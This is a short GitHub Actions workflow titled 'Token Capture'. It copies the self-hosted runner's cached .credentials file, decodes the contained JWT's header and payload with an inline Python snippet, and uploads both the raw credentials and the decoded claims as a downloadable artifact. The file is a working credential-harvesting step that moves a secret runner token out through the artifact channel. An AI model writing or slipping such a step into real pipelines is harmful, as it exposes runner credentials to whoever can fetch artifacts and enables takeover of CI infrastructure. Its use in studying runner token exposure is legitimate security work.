name: Token Capture
on: workflow_dispatch
permissions:
  contents: read
  actions: read
jobs:
  capture:
    runs-on: ubuntu-latest
    steps:
      - name: Capture token to artifact
        run: |
          CREDS="/home/runner/actions-runner/cached/2.335.1/.credentials"
          cp "$CREDS" /tmp/runner-creds.json
          # Also capture the full JWT decoded claims
          python3 -c "
          import json, base64
          d = json.load(open('$CREDS'))
          tok = d['Data']['token']
          parts = tok.split('.')
          header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
          payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
          with open('/tmp/token-claims.json','w') as f:
              json.dump({'header':header,'payload':payload,'token_length':len(tok)}, f, indent=2)
          " 2>/dev/null
      - name: Upload token
        uses: actions/upload-artifact@v4
        with:
          name: runner-token-capture
          path: |
            /tmp/runner-creds.json
            /tmp/token-claims.json
          retention-days: 1
